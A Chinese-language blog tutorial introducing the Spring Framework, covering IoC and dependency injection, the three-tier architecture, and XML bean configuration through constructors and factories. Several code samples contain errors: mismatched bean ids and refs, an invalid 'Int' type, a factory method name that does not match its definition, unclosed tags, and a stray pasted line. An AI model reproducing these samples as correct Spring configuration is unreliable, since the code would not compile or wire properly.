<li><code>可能存在局限性</code>：虽然框架提高了开发效率并可以帮助开发人员解决常见问题，但是在某些情况下，特定的应用需求可能超出框架的范围，从而导致应用程序无法满足要求。开发人员可能需要更多的控制权和自由度，同时需要在框架和应用程序之间进行权衡取舍。</li>
<li><code>版本变更和兼容性问题</code>：框架的版本发布和迭代通常会导致代码库的大规模变更，进而导致应用程序出现兼容性问题和漏洞。当框架变更时，需要考虑框架是否向下兼容，以及如何进行适当的测试、迁移和升级。</li>
<li><code>架构风险</code>：框架涉及到很多抽象和概念，如果开发者没有足够的理解和掌握其架构，可能会导致系统出现设计和架构缺陷，从而影响系统的健康性和安全性</li>
</ol>
<h3 id="Spring基本介绍"><a href="#Spring基本介绍" class="headerlink" title="Spring基本介绍"></a>Spring基本介绍</h3><h4 id="Spring和SpringFramework的关系"><a href="#Spring和SpringFramework的关系" class="headerlink" title="Spring和SpringFramework的关系"></a>Spring和SpringFramework的关系</h4><p><strong>广义的 Spring：Spring 技术栈（全家桶）</strong><br>广义上的<code>Spring</code>泛指以Spring Framework为基础的<code>Spring</code>技术栈。经过十多年的发展，Spring已经不再是一个单纯的应用框架，而是逐渐发展成为一个由多个不同子项目（模块）组成的成熟技术，例如SpringFramework、SpringMVC、SpringBoot、SpringCloud、SpringData、SpringSecurity等，其中SpringFramework是其他子项目的基础。这些子项目涵盖了从企业级应用开发到云计算等各方面的内容，能够帮助开发人员解决软件发展过程中不断产生的各种实际问题，给开发人员带来了更好的开发体验。</p>
<p><strong>狭义的Spring：SpringFramework（基础框架）</strong><br>狭义的Spring特指SpringFramework，通常我们将它称为Spring框架。SpringFramework（Spring框架）是一个开源的应用程序框架，由SpringSource公司开发，最初是为了解决企业级开发中各种常见问题而创建的。它提供了很多功能，例如：<code>依赖注入（DependencyInjection）、面向切面编程（AOP）、声明式事务管理（TX）</code>等。其主要目标是使企业级应用程序的开发变得更加简单和快速，并且Spring框架被广泛应用于Java企业开发领域。<br>Spring全家桶的其他框架都是以SpringFramework框架为基础！</p>
<h4 id="SpringFramework主要功能模块"><a href="#SpringFramework主要功能模块" class="headerlink" title="SpringFramework主要功能模块"></a>SpringFramework主要功能模块</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240816143429.png" alt="主要功能模块"></p>
<table>
<thead>
<tr>
<th>功能模块</th>
<th>功能介绍</th>
</tr>
</thead>
<tbody><tr>
<td>Core Container</td>
<td>核心容器，在Spring环境下使用任何功能都必须基于IOC容器。</td>
</tr>
<tr>
<td>AOP&amp;Aspects</td>
<td>面向切面编程</td>
</tr>
<tr>
<td>TX</td>
<td>声明式事务管理。</td>
</tr>
<tr>
<td>SpringMVC</td>
<td>提供了面向Web应用程序的集成功能。</td>
</tr>
</tbody></table>
<h4 id="SpringFramework的优势"><a href="#SpringFramework的优势" class="headerlink" title="SpringFramework的优势"></a>SpringFramework的优势</h4><ol>
<li>丰富的生态系统：Spring 生态系统非常丰富，支持许多模块和库，如 Spring Boot、Spring、Security、Spring Cloud 等等，可以帮助开发人员快速构建高可靠性的企业应用程序。</li>
<li>模块化的设计：框架组件之间的松散耦合和模块化设计使得 Spring Framework 具有良好的可重用性、可扩展性和可维护性。开发人员可以轻松地选择自己需要的模块，根据自己的需求进行开发。</li>
<li>简化 Java 开发：Spring Framework 简化了 Java 开发，提供了各种工具和 API，可以降低开发复杂度和学习成本。同时，Spring Framework 支持各种应用场景，包括 Web 应用程序、RESTful API、消息传递、批处理等等。</li>
<li>不断创新和发展：Spring Framework 开发团队一直在不断创新和发展，保持与最新技术的接轨，为开发人员提供更加先进和优秀的工具和框架</li>
</ol>
<h4 id="Spring框架企业级应用开发的三层架构模式"><a href="#Spring框架企业级应用开发的三层架构模式" class="headerlink" title="Spring框架企业级应用开发的三层架构模式"></a>Spring框架企业级应用开发的三层架构模式</h4><p>在Java开发中，特别是基于Spring框架的企业级应用开发中，DAO（Data Access Object）、Service（业务服务层）和Controller（控制层）是三层架构模式的具体实现。它们各自承担着不同的职责，下面将具体介绍每个层次的含义及功能：</p>
<ol>
<li><p>DAO (Data Access Object) - 数据访问对象</p>
<ul>
<li><p><strong>职责</strong>：负责与数据库或其他持久化存储进行交互。</p>
</li>
<li><p><strong>功能</strong>：</p>
<ul>
<li>封装了对数据库的CRUD（创建、读取、更新、删除）操作。</li>
<li>提供了数据存取的抽象接口，使得上层逻辑不需要关心具体的数据库实现细节。</li>
<li>可以使用JDBC直接操作数据库，或者更常用的是使用ORM工具如Hibernate或MyBatis来简化数据操作。</li>
<li>通常会定义接口，并由其实现类完成具体的数据访问逻辑。</li>
</ul>
</li>
<li><p><strong>示例</strong>：<code>UserDao</code>接口及其<code>UserDaoImpl</code>实现类，用于用户信息的增删改查。</p>
</li>
</ul>
</li>
<li><p>Service (业务服务层)</p>
<ul>
<li><p><strong>职责</strong>：处理业务逻辑，作为应用程序的核心部分。</p>
</li>
<li><p><strong>功能</strong>：</p>
<ul>
<li>包含业务规则和流程，例如验证、计算、事务管理等。</li>
<li>调用一个或多个DAO来执行数据操作，确保数据的一致性和完整性。</li>
<li>可能涉及与其他服务的通信，比如调用第三方API或微服务。</li>
<li>是表示层（如Web控制器）和数据访问层之间的桥梁。</li>
<li>在Spring应用中，通常使用@Service注解来标识业务服务组件，并利用依赖注入来管理组件间的依赖关系。</li>
</ul>
</li>
<li><p><strong>示例</strong>：<code>UserService</code>类，它可能包含注册新用户、更新用户信息、验证用户登录等功能。</p>
</li>
</ul>
</li>
<li><p>Controller (控制层)</p>
<ul>
<li><p><strong>职责</strong>：处理HTTP请求，协调用户界面和业务逻辑。</p>
</li>
<li><p><strong>功能</strong>：</p>
<ul>
<li>接收来自用户的请求，并调用相应的Service方法来处理这些请求。</li>
<li>根据业务逻辑的处理结果，选择适当的视图（View）返回给用户，或者生成JSON&#x2F;XML等格式的数据响应。</li>
<li>在MVC模式中，控制器不直接与模型（Model）交互，而是通过服务层间接地与之沟通。</li>
<li>对于RESTful Web服务，控制器负责解析URL路径参数、查询参数、请求体等内容，并将它们转换为Java对象传递给服务层。</li>
<li>在Spring MVC或Spring Boot应用中，使用@Controller或@RestController注解来定义控制器。</li>
</ul>
</li>
<li><p><strong>示例</strong>：<code>UserController</code>类，它接收用户提交的表单数据，调用<code>UserService</code>来处理用户注册或登录请求，然后根据处理结果重定向页面或返回JSON响应。</p>
</li>
</ul>
</li>
</ol>
<p>在实际开发中，这三个层次之间通常是松耦合的，这意味着每一层都尽量减少对其他层的直接依赖，从而提高代码的可维护性和可测试性。例如，Service层不应该直接调用Controller层的方法，而应该通过接口或事件机制进行通信；同样地，DAO层也不应该知道Service层的存在，它只需要提供基本的数据操作接口即可。这种设计原则有助于创建更加模块化的软件系统，同时也便于单元测试和集成测试。</p>
<hr>
<h1 id="容器-IoC"><a href="#容器-IoC" class="headerlink" title="容器: IoC"></a>容器: IoC</h1><p><code>IoC</code>是<code>Inversion of Control</code>的简写，译为“<code>控制反转</code>”，它不是一门技术，而是<strong>一种设计思想</strong>，是一个重要的面向对象编程法则，能够指导我们如何设计出松耦合、更优良的程序。Spring 通过 IoC 容器来管理所有 Java 对象的<strong>实例化和初始化，控制对象与对象之间的依赖关系</strong>。我们将<strong>由 IoC容器管理的 Java 对象称为 Spring Bean</strong>，它与使用关键字 new 创建的 Java 对象没有任何区别。IoC 容器是 Spring 框架中最重要的核心组件之一，它贯穿了 Spring 从诞生到成长的整个过程。</p>
<p><strong>IoC容器负责管理对象的创建、配置和生命周期，控制对象与对象之间的依赖关系。</strong></p>
<p><strong>控制反转：</strong>控制反转（Inversion of Control,  IoC）是一种设计思想，用于解耦软件组件之间的依赖关系。它将传统上由程序代码直接管理的对象<strong>创建和生命周期管理</strong>的职责交给了框架或容器来处理。通过这种方式，对象不再需要自己创建或查找其依赖项，而是由外部环境（通常是IoC容器）在运行时提供这些依赖项。控制反转主要依靠依赖（Dependency Injection, DI）注入实现。</p>
<p><strong>依赖注入：</strong>依赖注入（Dependency Injection, DI）是控制反转（IoC）的一种具体实现方式，它通过将对象的依赖项作为外部配置提供给对象，而不是让对象自己创建或查找这些依赖。这样可以减少组件之间的耦合度，并且使代码更容易测试和维护。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在Spring框架中，”组件”（Component）是一个核心概念，它指的是Spring容器管理的一个对象，这个对象可以是任何POJO（Plain Old Java Object，即普通的Java对象），但它通过特定的方式被Spring框架识别并管理。Spring容器负责这些组件的创建、配置、组装和生命周期管理。</p>
<p>一个项目是由多个组件(<strong>可以复用的JAVA对象</strong>)搭建而成的：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240816144616.png"></p>
<p>组件是一类可以复用的对象，但对象不一定是组件。</p>
<p>Spring能够充当组件管理角色(IoC)：</p>
<ul>
<li>组件对象实例化</li>
<li>组件属性属性赋值</li>
<li>组件对象之间引用</li>
<li>组件对象存活周期管理</li>
<li>……</li>
</ul>
<p>通过Spring管理组件，可以</p>
<ol>
<li>降低了组件之间的耦合性：Spring IoC容器通过依赖注入机制，将组件之间的依赖关系削弱，减少了程序组件之间的耦合性，使得组件更加松散地耦合。</li>
<li>提高了代码的可重用性和可维护性：将组件的实例化过程、依赖关系的管理等功能交给Spring IoC容器处理，使得组件代码更加模块化、可重用、更易于维护。</li>
<li>方便了配置和管理：Spring IoC容器通过XML文件或者注解，轻松的对组件进行配置和管理，使得组件的切换、替换等操作更加的方便和快捷。</li>
<li><em>交给Spring管理的对象（组件），方可享受Spring框架的其他功能（AOP,声明事务管理</em></li>
</ol>
<h3 id="Spring-IoC容器和容器实现"><a href="#Spring-IoC容器和容器实现" class="headerlink" title="Spring IoC容器和容器实现"></a>Spring IoC容器和容器实现</h3><p>普通容器，存储对象：数组、集合等<br>复杂容器：存储和管理对象</p>
<h4 id="SpringIoC容器"><a href="#SpringIoC容器" class="headerlink" title="SpringIoC容器"></a>SpringIoC容器</h4><p>Spring IoC容器，负责实例化、配置和组装 bean（组件）。容器通过读取配置元数据来获取有关要实例化、配置和组装组件的指令。配置元数据以<code>XML、Java注解或Java</code>代码形式表现。它允许表达组成应用程序的组件以及这些组件之间丰富的相互依赖关系。</p>
<h5 id="SpringIoC-容器接口和实现类"><a href="#SpringIoC-容器接口和实现类" class="headerlink" title="SpringIoC 容器接口和实现类"></a>SpringIoC 容器接口和实现类</h5><p><code>BeanFactory</code>接口提供了一种高级配置机制，能够管理任何类型的对象，它是SpringIoC容器标准化超接口！<br><code>ApplicationContext</code>是 BeanFactory 的子接口。它扩展了以下功能：</p>
<ul>
<li>更容易与 Spring 的 AOP 功能集成</li>
<li>消息资源处理（用于国际化）</li>
<li>特定于应用程序给予此接口实现，例如Web应用程序的 WebApplicationContext</li>
</ul>
<p>简而言之，BeanFactory 提供了配置框架和基本功能，而ApplicationContext 添加了更多特定于企业的功能。 ApplicationContext 是 BeanFactory 的完整超集！ </p>
<p><strong>ApplicationContext容器实现类</strong></p>
<table>
<thead>
<tr>
<th>类型名</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>*ClassPathXmlApplicationContext</td>
<td>通过读取类路径下的<code>XML</code>格式的配置文件创建<code>IOC</code>容器对象</td>
</tr>
<tr>
<td>FileSystemXmlApplicationContext</td>
<td>通过文件系统路径读取<code>XML</code>格式的配置文件创建<code>IOC</code>容器对象</td>
</tr>
<tr>
<td>*AnnotationConfigApplicationContext</td>
<td>通过读取<code>Java配置类</code>创建<code>IOC</code>容器对象</td>
</tr>
<tr>
<td>*WebApplicationContext</td>
<td>专门为Web应用准备，基于<code>Web</code>环境创建<code>IOC</code>容器对象，并将对象引入存入<code>ServletContext</code>域中</td>
</tr>
</tbody></table>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240816151122.png" alt="常用框架"></p>
<ol>
<li>XML配置方式：是Spring框架最早的配置方式之一，通过在XML文件中定义Bean及其依赖关系、Bean的作用域等信息，让Spring IoC容器来管理Bean之间的依赖关系。该方式从Spring框架的第一版开始提供支持。</li>
<li>注解方式：从Spring 2.5版本开始提供支持，可以通过在Bean类上使用注解来代替XML配置文件中的配置信息。通过在Bean类上加上相应的注解（如@Component, @Service, @Autowired等），将Bean注册到Spring IoC容器中，这样Spring IoC容器就可以管理这些Bean之间的依赖关系。</li>
<li><strong>Java配置类方式</strong>：从Spring 3.0版本开始提供支持，通过Java类来定义Bean、Bean之间的依赖关系和配置信息，从而代替XML配置文件的方式。Java配置类是一种使用Java编写配置信息的方式，通过@Configuration、@Bean等注解来实现Bean和依赖关系的配置。 为了迎合当下开发环境，我们将以配置类+注解方式为主进行讲解！</li>
</ol>
<h5 id="Spring-IoC-DI-概念"><a href="#Spring-IoC-DI-概念" class="headerlink" title="Spring IoC &#x2F; DI 概念"></a>Spring IoC &#x2F; DI 概念</h5><p><strong>IoC容器</strong><br>Spring IoC 容器，负责实例化、配置和组装 bean（组件）核心容器。容器通过读取配置元数据来获取有关要实例化、配置和组装组件的指令。</p>
<p><strong>IoC（Inversion of Control）控制反转</strong><br>（通过反射创建对应类的对象）<br>IoC 主要是针对对象的创建和调用控制而言的，也就是说，当应用程序需要使用一个对象时，不再是应用程序直接创建该对象，而是由 IoC 容器来创建和管理，即控制权由应用程序转移到 IoC 容器中，也就是“反转”了控制权。这种方式基本上是通过依赖查找的方式来实现的，即 IoC 容器维护着构成应用程序的对象，并负责创建这些对象。</p>
<p><strong>DI (Dependency Injection) 依赖注入</strong><br>（将一个对象注入另一个对象的属性中–&gt;即一个对象作为另一个对象的属性的值）<br>DI 是指在组件之间传递依赖关系的过程中，将依赖关系在容器内部进行处理，这样就不必在应用程序代码中硬编码对象之间的依赖关系，实现了对象之间的解耦合。在 Spring 中，DI是通过 XML 配置文件或注解的方式实现的。它提供了三种形式的依赖注入：构造函数注入、Setter方法注入和接口注入。</p>
<h3 id="Spring-IoC-DI-实现步骤"><a href="#Spring-IoC-DI-实现步骤" class="headerlink" title="Spring IoC&#x2F;DI 实现步骤"></a>Spring IoC&#x2F;DI 实现步骤</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240816212321.png" alt="IoC实践步骤"></p>
<ol>
<li><code>配置元数据</code></li>
<li><code>实例化IoC容器</code></li>
<li><code>获取Bean（组件）</code></li>
</ol>
<h2 id="基于XML的组件管理配置方式"><a href="#基于XML的组件管理配置方式" class="headerlink" title="基于XML的组件管理配置方式"></a>基于XML的组件管理配置方式</h2><hr>
<h3 id="组件-Bean-信息声明配置-IoC"><a href="#组件-Bean-信息声明配置-IoC" class="headerlink" title="组件(Bean)信息声明配置(IoC)"></a>组件(Bean)信息声明配置(IoC)</h3><p>如何定义XML配置文件，声明组件类信息，交给Spring的IoC容器进行组件管理</p>
<p>常用的对象实例化方法</p>
<ol>
<li>构造函数实例化</li>
<li>工厂模式实例化<br><a href="https://fushiye.github.io/2024/09/03/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">工厂模式</a></li>
</ol>
<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>创建Maven工程，导入SpringIoC相关依赖：建议创建父工程（打包方式为pom），避免子工程重复导入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--spring context依赖--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--当你引入Spring Context依赖之后，表示将Spring的基础依赖引入了--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--junit5测试--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（以下方法必须在上步完成情况下）<br>将类放入IoC容器，需要创建一个Spring配置文件，在当前工程的resources文件夹上右键 -&gt; 新建 -&gt; XML配置文件 -&gt; spring配置文件</p>
<hr>
<h4 id="基于无参构造函数"><a href="#基于无参构造函数" class="headerlink" title="基于无参构造函数"></a>基于无参构造函数</h4><p>创建一个可以使用无参构造器实例化的组件的IoC配置：<br>一个bean代表一个组件对象，包含了组件的信息；<strong>当配置文件被IoC容器读取时，会根据此实例化对象</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">&quot;组件的标识，自定义，唯一，方便后期读取&quot;</span> <span class="attr">class</span> = <span class="string">&quot;组件所属类的全限定名&quot;</span> /&gt;</span></span><br><span class="line"># 示例</span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.learn.Spring6.User&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>id即对象（组件）名，class即对象所属类的完整名称，包括它的包名和类名</li>
<li>根据class所指定的组件类创建一个对象（组件），名称就是id（<strong>相当于new一个class的对象id</strong>）</li>
<li>默认是单例的，写一个bean就声明一个组件，实例化一个对象。</li>
</ul>
<hr>
<h4 id="基于工厂模式的"><a href="#基于工厂模式的" class="headerlink" title="基于工厂模式的"></a>基于工厂模式的</h4><p>通过工厂模式实例化组件的IoC配置</p>
<h5 id="静态工厂"><a href="#静态工厂" class="headerlink" title="静态工厂"></a>静态工厂</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">&quot;组件的标识，自定义，唯一，方便后期读取&quot;</span> <span class="attr">class</span> = <span class="string">&quot;工厂类的全限定名&quot;</span> <span class="attr">factory-method</span> = <span class="string">&quot;static方法名&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>id</code>即组件（对象）名称；<code>class</code>即工厂类的完整名称，包括它的包名和类名；</li>
<li><code>factory-method</code>即调用的<strong>静态的</strong>能返回实例化对象的工厂方法</li>
</ul>
<p>示例：</p>
<p>工厂类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ClientService</span> <span class="variable">clientService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClientService</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ClientService</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ClientService <span class="title function_">createInstance</span><span class="params">()</span> &#123;</span><br><span class="line">    	<span class="keyword">return</span> clientService;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cs&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.learn.Spring6.ClientService&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;createInstance&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="非静态工厂"><a href="#非静态工厂" class="headerlink" title="非静态工厂"></a>非静态工厂</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--首先 配置工厂类的组件信息，相当于实例化工厂类的对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">&quot;组件的标识，自定义，唯一，方便后期读取&quot;</span> <span class="attr">class</span> = <span class="string">&quot;工厂类的全限定名&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--然后 指定非静态工厂对象和方法名，配置生成的IoC信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">&quot;组件的标识，自定义，唯一，方便后期读取&quot;</span> <span class="attr">factory-bean</span> = <span class="string">&quot;上面bean的id&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;工厂方法名&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>factory-method指定的方法必须是非静态的</li>
</ul>
<p>示例：</p>
<p>工厂类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientService</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">static</span> <span class="variable">ClientServiceImplclientService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClientServiceImpl</span>();</span><br><span class="line">   <span class="keyword">public</span> ClientService <span class="title function_">createClientServiceInstance</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> clientService;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;defaultCS&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.learn.Spring6.ClientService&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cs&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;defaultCS&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;createInstance&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="基于FactoryBean标准工厂接口的"><a href="#基于FactoryBean标准工厂接口的" class="headerlink" title="基于FactoryBean标准工厂接口的"></a>基于FactoryBean标准工厂接口的</h4><p>工厂模式的简化，见下文。</p>
<hr>
<p>xxxxxxxxxx <groupId>org.springframework.boot</groupId><artifactId>spring-boot-maven-plugin</artifactId><version>3.0.5</version>xml</p>
<h3 id="组件的依赖注入（DI）配置"><a href="#组件的依赖注入（DI）配置" class="headerlink" title="组件的依赖注入（DI）配置"></a>组件的依赖注入（DI）配置</h3><p><code>注入：即变量赋值</code>，只是这个变量就是class类中的成员属性<br>实现IoC容器中Bean之间的引用。</p>
<p><strong>引用和被引用的组件都必须放在IoC容器中</strong></p>
<p>Spring是先创建对象再赋值的。</p>
<p>组件属性赋值（依赖注入）必须使用构造函数或有set方法！</p>
<h4 id="基于构造函数"><a href="#基于构造函数" class="headerlink" title="基于构造函数"></a>基于构造函数</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDao</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line">    UserDao userDao;</span><br><span class="line">    Int can;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">(UserDao useDao)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">(UserDao useDao,Int can)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">        <span class="built_in">this</span>.can = can;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="单个构造参数"><a href="#单个构造参数" class="headerlink" title="单个构造参数"></a><strong>单个构造参数</strong></h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--将组件全部放入IoC容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uerDao&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.spring.test.UserDao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uerService&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.spring.test.UserService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span> = <span class="string">&quot;userDao&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>ref</code>引用的其他的bean</li>
<li>由于SpringIoC容器会先创建对象（IoC）再进行赋值（DI），所以两个bean的顺序没有要求</li>
</ul>
<h5 id="多个构造参数"><a href="#多个构造参数" class="headerlink" title="多个构造参数"></a><strong>多个构造参数</strong></h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--将组件全部放入IoC容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uerDao&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.spring.test.UserDao&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--方式1，按构造参数的顺序填写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uerService&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.spring.test.UserService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span> = <span class="string">&quot;userDao&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span> = <span class="string">&quot;19&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--方式2，按构造参数的名称填写--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--推荐！--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uerService&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.spring.test.UserService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span> = <span class="string">&quot;can&quot;</span> <span class="attr">value</span> = <span class="string">&quot;19&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span> = <span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span> = <span class="string">&quot;userDao&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--方式3，按构造参数的下标填写，小标从0开始，从左到右--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uerService&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.spring.test.UserService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">&quot;1&quot;</span> <span class="attr">value</span> = <span class="string">&quot;19&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span> = <span class="string">&quot;0&quot;</span> <span class="attr">ref</span> = <span class="string">&quot;userDao&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>ref</code>为引用的其他的bean，<code>当属性为其他类的对象时使用;</code></li>
<li><code>value</code>为属性值，当属性为基本数据类型或引用数据类型。</li>
<li><code>name</code>为属性名称;<code>index</code>为参数下标，从0开始</li>
<li><strong>推荐使用方法2</strong></li>
</ul>
